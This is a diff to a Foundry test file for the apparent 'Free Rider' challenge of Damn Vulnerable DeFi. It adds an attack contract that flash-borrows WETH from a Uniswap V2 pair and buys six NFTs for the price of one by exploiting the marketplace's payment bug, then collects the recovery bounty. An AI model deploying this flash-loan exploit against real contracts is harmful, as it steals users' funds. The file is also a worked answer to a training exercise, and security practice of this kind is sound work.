@@ -11,11 +11,68 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";
+
+contract AttackMarketplace is IERC721Receiver {
+    FreeRiderNFTMarketplace immutable i_marketPlace;
+    FreeRiderRecoveryManager immutable i_recoveryManager;
+    DamnValuableNFT immutable i_token;
+    WETH immutable i_weth;
+    IUniswapV2Pair immutable i_pair;
+    address immutable i_player;
+
+    constructor(
+        FreeRiderNFTMarketplace marketplace,
+        FreeRiderRecoveryManager recoverManager,
+        DamnValuableNFT token,
+        WETH weth,
+        IUniswapV2Pair pair
+    ) {
+        i_marketPlace = marketplace;
+        i_recoveryManager = recoverManager;
+        i_token = token;
+        i_weth = weth;
+        i_pair = pair;
+        i_player = msg.sender;
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
+        require(msg.sender == address(i_pair), "Incorrect caller");
+        require(sender == address(this), "Callee is not the this contract");
+        (uint256 borrowed, ) = abi.decode(data, (uint256, string));
+        require(amount0 == borrowed, "Borrowed amount mismatch");
+        require(amount1 == 0, "Other token not borrowed");
+        i_weth.withdraw(borrowed);
+        uint256[] memory ids = new uint256[](6);
+        for(uint i = 0 ; i < 6 ; i++){
+            ids[i] = i;
+        }
+        i_marketPlace.buyMany{value: borrowed}(ids);
+        i_weth.deposit{value: 16 ether}();
+        i_weth.transfer(address(i_pair), 16 ether);
+    }
+    function attack() external {
+        bytes memory data = abi.encode(15 ether, "buy nft");
+        i_pair.swap(15 ether, 0, address(this), data);
+        (bool success, ) = i_player.call{value: address(this).balance}("");
+        (success);
+        for(uint256 i = 0 ; i < 6 ; i++){
+            i_token.transferFrom(address(this), i_player, i);
+        }
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recoveryManagerOwner = makeAddr("recoveryManagerOwner");
+    address randomAddress = makeAddr("randomAddress");
 
     // The NFT marketplace has 6 tokens, at 15 ETH each
     uint256 constant NFT_PRICE = 15 ether;
@@ -122,7 +179,17 @@ contract FreeRiderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_freeRider() public checkSolvedByPlayer {}
+    function test_freeRider() public checkSolvedByPlayer {
+
+        AttackMarketplace attackContract = new AttackMarketplace(
+            marketplace, recoveryManager, nft, weth, uniswapPair
+        );
+        attackContract.attack();
+        bytes memory data = abi.encode(player);
+        for(uint i = 0 ; i < AMOUNT_OF_NFTS; i++){
+            nft.safeTransferFrom(player, address(recoveryManager), i, data);
+        }
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
